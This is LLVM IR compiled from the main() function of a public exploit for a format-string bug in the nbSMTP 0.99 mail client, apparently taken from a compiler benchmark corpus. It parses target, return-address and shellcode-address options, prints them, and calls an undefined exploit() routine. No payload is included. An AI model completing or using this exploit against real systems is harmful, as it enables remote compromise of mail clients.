; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/linux/remote/extr_1138.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/linux/remote/extr_1138.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.TYPE_2__ = type { i8*, i32, i32, i32 }

@.str = private unnamed_addr constant [45 x i8] c"\0A nbSMTP v0.99 remote format string exploit\0A\00", align 1
@.str.1 = private unnamed_addr constant [34 x i8] c" by CoKi <coki@nosystem.com.ar>\0A\0A\00", align 1
@.str.2 = private unnamed_addr constant [10 x i8] c"r:s:t:lo:\00", align 1
@EOF = common dso_local global i8 0, align 1
@optarg = common dso_local global i32 0, align 4
@.str.3 = private unnamed_addr constant [8 x i8] c"unknown\00", align 1
@targets = common dso_local global %struct.TYPE_2__* null, align 8
@.str.4 = private unnamed_addr constant [20 x i8] c" [*] system\09\09\09: %s\0A\00", align 1
@.str.5 = private unnamed_addr constant [30 x i8] c" [*] return address\09\09: %010p\0A\00", align 1
@.str.6 = private unnamed_addr constant [32 x i8] c" [*] shellcode address\09\09: %010p\00", align 1
@stdout = common dso_local global i32 0, align 4
@.str.7 = private unnamed_addr constant [14 x i8] c" (offset %d)\0A\00", align 1
@.str.8 = private unnamed_addr constant [2 x i8] c"\0A\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main(i32 %0, i8** %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i8**, align 8
  %6 = alloca i8, align 1
  %7 = alloca i8*, align 8
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  store i32 0, i32* %3, align 4
  store i32 %0, i32* %4, align 4
  store i8** %1, i8*** %5, align 8
  store i8* null, i8** %7, align 8
  store i32 0, i32* %8, align 4
  store i32 0, i32* %9, align 4
  store i32 0, i32* %10, align 4
  store i32 0, i32* %11, align 4
  %13 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([45 x i8], [45 x i8]* @.str, i64 0, i64 0))
  %14 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([34 x i8], [34 x i8]* @.str.1, i64 0, i64 0))
  br label %15

15:                                               ; preds = %81, %2
  %16 = load i32, i32* %4, align 4
  %17 = load i8**, i8*** %5, align 8
  %18 = call signext i8 @getopt(i32 %16, i8** %17, i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.2, i64 0, i64 0))
  store i8 %18, i8* %6, align 1
  %19 = sext i8 %18 to i32
  %20 = load i8, i8* @EOF, align 1
  %21 = sext i8 %20 to i32
  %22 = icmp ne i32 %19, %21
  br i1 %22, label %23, label %82

23:                                               ; preds = %15
  %24 = load i8, i8* %6, align 1
  %25 = sext i8 %24 to i32
  switch i32 %25, label %76 [
    i32 114, label %26
    i32 115, label %29
    i32 116, label %32
    i32 108, label %68
    i32 111, label %70
  ]

26:                                               ; preds = %23
  %27 = load i32, i32* @optarg, align 4
  %28 = call i32 @strtoul(i32 %27, i32* null, i32 0)
  store i32 %28, i32* %9, align 4
  store i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.3, i64 0, i64 0), i8** %7, align 8
  br label %81

29:                                               ; preds = %23
  %30 = load i32, i32* @optarg, align 4
  %31 = call i32 @strtoul(i32 %30, i32* null, i32 0)
  store i32 %31, i32* %8, align 4
  br label %81

32:                                               ; preds = %23
  %33 = load i32, i32* @optarg, align 4
  %34 = call i32 @atoi(i32 %33)
  %35 = sub nsw i32 %34, 1
  store i32 %35, i32* %10, align 4
  %36 = load %struct.TYPE_2__*, %struct.TYPE_2__** @targets, align 8
  %37 = load i32, i32* %10, align 4
  %38 = sext i32 %37 to i64
  %39 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %36, i64 %38
  %40 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %39, i32 0, i32 3
  %41 = load i32, i32* %40, align 8
  %42 = icmp ne i32 %41, 0
  br i1 %42, label %43, label %62

43:                                               ; preds = %32
  %44 = load %struct.TYPE_2__*, %struct.TYPE_2__** @targets, align 8
  %45 = load i32, i32* %10, align 4
  %46 = sext i32 %45 to i64
  %47 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %44, i64 %46
  %48 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %47, i32 0, i32 0
  %49 = load i8*, i8** %48, align 8
  store i8* %49, i8** %7, align 8
  %50 = load %struct.TYPE_2__*, %struct.TYPE_2__** @targets, align 8
  %51 = load i32, i32* %10, align 4
  %52 = sext i32 %51 to i64
  %53 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %50, i64 %52
  %54 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %53, i32 0, i32 1
  %55 = load i32, i32* %54, align 8
  store i32 %55, i32* %9, align 4
  %56 = load %struct.TYPE_2__*, %struct.TYPE_2__** @targets, align 8
  %57 = load i32, i32* %10, align 4
  %58 = sext i32 %57 to i64
  %59 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %56, i64 %58
  %60 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %59, i32 0, i32 2
  %61 = load i32, i32* %60, align 4
  store i32 %61, i32* %8, align 4
  br label %67

62:                                               ; preds = %32
  %63 = load i8**, i8*** %5, align 8
  %64 = getelementptr inbounds i8*, i8** %63, i64 0
  %65 = load i8*, i8** %64, align 8
  %66 = call i32 @use(i8* %65)
  br label %67

67:                                               ; preds = %62, %43
  br label %81

68:                                               ; preds = %23
  %69 = call i32 (...) @printlist()
  br label %81

70:                                               ; preds = %23
  %71 = load i32, i32* @optarg, align 4
  %72 = call i32 @atoi(i32 %71)
  store i32 %72, i32* %11, align 4
  %73 = load i32, i32* %11, align 4
  %74 = load i32, i32* %8, align 4
  %75 = add nsw i32 %74, %73
  store i32 %75, i32* %8, align 4
  br label %81

76:                                               ; preds = %23
  %77 = load i8**, i8*** %5, align 8
  %78 = getelementptr inbounds i8*, i8** %77, i64 0
  %79 = load i8*, i8** %78, align 8
  %80 = call i32 @use(i8* %79)
  br label %81

81:                                               ; preds = %76, %70, %68, %67, %29, %26
  br label %15

82:                                               ; preds = %15
  %83 = load i32, i32* %9, align 4
  %84 = icmp eq i32 %83, 0
  br i1 %84, label %85, label %90

85:                                               ; preds = %82
  %86 = load i8**, i8*** %5, align 8
  %87 = getelementptr inbounds i8*, i8** %86, i64 0
  %88 = load i8*, i8** %87, align 8
  %89 = call i32 @use(i8* %88)
  br label %90

90:                                               ; preds = %85, %82
  %91 = load i32, i32* %8, align 4
  %92 = icmp eq i32 %91, 0
  br i1 %92, label %93, label %98

93:                                               ; preds = %90
  %94 = load i8**, i8*** %5, align 8
  %95 = getelementptr inbounds i8*, i8** %94, i64 0
  %96 = load i8*, i8** %95, align 8
  %97 = call i32 @use(i8* %96)
  br label %98

98:                                               ; preds = %93, %90
  %99 = load i8*, i8** %7, align 8
  %100 = icmp eq i8* %99, null
  br i1 %100, label %101, label %102

101:                                              ; preds = %98
  store i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.3, i64 0, i64 0), i8** %7, align 8
  br label %102

102:                                              ; preds = %101, %98
  %103 = load i8*, i8** %7, align 8
  %104 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([20 x i8], [20 x i8]* @.str.4, i64 0, i64 0), i8* %103)
  %105 = load i32, i32* %9, align 4
  %106 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([30 x i8], [30 x i8]* @.str.5, i64 0, i64 0), i32 %105)
  %107 = load i32, i32* %8, align 4
  %108 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([32 x i8], [32 x i8]* @.str.6, i64 0, i64 0), i32 %107)
  %109 = load i32, i32* @stdout, align 4
  %110 = call i32 @fflush(i32 %109)
  %111 = load i32, i32* %11, align 4
  %112 = icmp ne i32 %111, 0
  br i1 %112, label %113, label %116

113:                                              ; preds = %102
  %114 = load i32, i32* %11, align 4
  %115 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.7, i64 0, i64 0), i32 %114)
  br label %118

116:                                              ; preds = %102
  %117 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.8, i64 0, i64 0))
  br label %118

118:                                              ; preds = %116, %113
  %119 = load i32, i32* %9, align 4
  %120 = load i32, i32* %8, align 4
  %121 = call i32 @exploit(i32 %119, i32 %120)
  %122 = load i32, i32* %3, align 4
  ret i32 %122
}

declare dso_local i32 @printf(i8*, ...) #1

declare dso_local signext i8 @getopt(i32, i8**, i8*) #1

declare dso_local i32 @strtoul(i32, i32*, i32) #1

declare dso_local i32 @atoi(i32) #1

declare dso_local i32 @use(i8*) #1

declare dso_local i32 @printlist(...) #1

declare dso_local i32 @fflush(i32) #1

declare dso_local i32 @exploit(i32, i32) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
